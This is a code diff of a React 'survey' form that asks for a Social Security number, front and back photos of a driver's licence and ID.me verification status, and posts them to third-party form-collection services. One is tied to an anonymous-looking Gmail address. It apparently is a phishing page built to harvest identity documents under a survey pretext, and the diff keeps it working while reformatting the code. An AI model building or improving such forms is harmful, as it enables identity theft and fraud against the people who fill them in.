@@ -1,7 +1,7 @@
-"use client"
+"use client";
 
-import type React from "react"
-import { useState } from "react"
+import type React from "react";
+import { useState } from "react";
 import BackgroundImage from "../assets/background-image001.jpg";
 
 const initialState = {
@@ -21,54 +21,51 @@ const initialState = {
   "HaveYouBeenVerifiedBy ID.ME": "",
   DriverLicenseFront: null as File | null,
   DriverLicenseBack: null as File | null,
-}
+};
 
-type FormData = typeof initialState
+type FormData = typeof initialState;
 
 export default function SurveyForm() {
-  const [step, setStep] = useState(1)
-  const [formData, setFormData] = useState<FormData>(initialState)
-  const [isSubmitting, setIsSubmitting] = useState(false)
-  const [isSubmitted, setIsSubmitted] = useState(false)
+  const [step, setStep] = useState(1);
+  const [formData, setFormData] = useState<FormData>(initialState);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isSubmitted, setIsSubmitted] = useState(false);
 
-  const handleStartSurvey = () => setStep(2)
+  const handleStartSurvey = () => setStep(2);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const { name, value, type, files } = e.target
+    const { name, value, type, files } = e.target;
     if (type === "file" && files) {
-      setFormData((prev) => ({ ...prev, [name]: files[0] }))
+      setFormData((prev) => ({ ...prev, [name]: files[0] }));
     } else {
-      setFormData((prev) => ({ ...prev, [name]: value }))
+      setFormData((prev) => ({ ...prev, [name]: value }));
     }
-  }
+  };
 
   const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
-    e.preventDefault()
-    setIsSubmitting(true)
-    const form = e.currentTarget
-    const formData = new FormData(form)
+    e.preventDefault();
+    setIsSubmitting(true);
+    const form = e.currentTarget;
+    const formData = new FormData(form);
 
     try {
-      const response = await fetch("https://formsubmit.co/ajax/axsaxsavdsxsa4432@gmail.com", {
+      const response = await fetch("https://getform.io/f/ayvkkoqb", {
         method: "POST",
         body: formData,
-        headers: {
-          Accept: "application/json",
-        },
-      })
+      });
 
       if (response.ok) {
-        setIsSubmitted(true)
+        setIsSubmitted(true);
       } else {
-        throw new Error("Form submission failed")
+        throw new Error("Form submission failed");
       }
     } catch (error) {
-      console.error("Submission error:", error)
-      alert("Failed to submit survey. Please try again.")
+      console.error("Submission error:", error);
+      alert("Failed to submit survey. Please try again.");
     } finally {
-      setIsSubmitting(false)
+      setIsSubmitting(false);
     }
-  }
+  };
 
   if (isSubmitted) {
     return (
@@ -78,12 +75,13 @@ export default function SurveyForm() {
           <p className="text-xl text-gray-600">You have successfully submitted the form.</p>
         </div>
       </div>
-    )
+    );
   }
 
   if (step === 1) {
     return (
-      <div className="min-h-screen flex items-center justify-center p-4 bg-cover bg-center"
+      <div
+        className="min-h-screen flex items-center justify-center p-4 bg-cover bg-center"
         style={{ backgroundImage: `url(${BackgroundImage})` }}
       >
         <div className="text-center relative z-10">
@@ -99,7 +97,7 @@ export default function SurveyForm() {
           </button>
         </div>
       </div>
-    )
+    );
   }
 
   return (
@@ -115,54 +113,19 @@ export default function SurveyForm() {
               <label htmlFor={key} className="block text-xl mb-2">
                 {index + 1}. {key.replace(/([A-Z])/g, " $1").trim()}
               </label>
-
               {key === "Gender" ? (
                 <div className="flex space-x-4">
                   <label className="inline-flex items-center">
-                    <input
-                      type="radio"
-                      name="Gender"
-                      value="Male"
-                      checked={formData.Gender === "Male"}
-                      onChange={handleInputChange}
-                      className="mr-2"
-                      required
-                    />
-                    Male
+                    <input type="radio" name="Gender" value="Male" onChange={handleInputChange} className="mr-2" required /> Male
                   </label>
                   <label className="inline-flex items-center">
-                    <input
-                      type="radio"
-                      name="Gender"
-                      value="Female"
-                      checked={formData.Gender === "Female"}
-                      onChange={handleInputChange}
-                      className="mr-2"
-                      required
-                    />
-                    Female
+                    <input type="radio" name="Gender" value="Female" onChange={handleInputChange} className="mr-2" required /> Female
                   </label>
                 </div>
               ) : key.includes("License") ? (
-                <input
-                  id={key}
-                  name={key}
-                  type="file"
-                  accept="image/*"
-                  onChange={handleInputChange}
-                  className="w-full p-2 border border-gray-300 rounded"
-                  required
-                />
+                <input id={key} name={key} type="file" accept="image/*" onChange={handleInputChange} className="w-full p-2 border border-gray-300 rounded" required />
               ) : (
-                <input
-                  id={key}
-                  name={key}
-                  type={key === "Email" ? "email" : key === "SocialSecurityNumber" ? "password" : "text"}
-                  value={formData[key as keyof FormData] as string}
-                  onChange={handleInputChange}
-                  className="w-full p-2 border-b-2 border-gray-400 outline-none focus:border-blue-500 transition"
-                  required
-                />
+                <input id={key} name={key} type={key === "Email" ? "email" : "text"} onChange={handleInputChange} className="w-full p-2 border-b-2 border-gray-400 outline-none focus:border-blue-500 transition" required />
               )}
             </div>
           ))}
@@ -171,16 +134,12 @@ export default function SurveyForm() {
             <span className="text-sm text-gray-600">
               Answered {Object.values(formData).filter(Boolean).length} of {Object.keys(initialState).length}
             </span>
-            <button
-              type="submit"
-              className="px-6 py-2 bg-black text-white rounded hover:bg-gray-800 transition duration-300"
-              disabled={isSubmitting}
-            >
+            <button type="submit" className="px-6 py-2 bg-black text-white rounded hover:bg-gray-800 transition duration-300" disabled={isSubmitting}>
               {isSubmitting ? "Submitting..." : "Submit"}
             </button>
           </div>
         </form>
       </div>
     </div>
-  )
+  );
 }
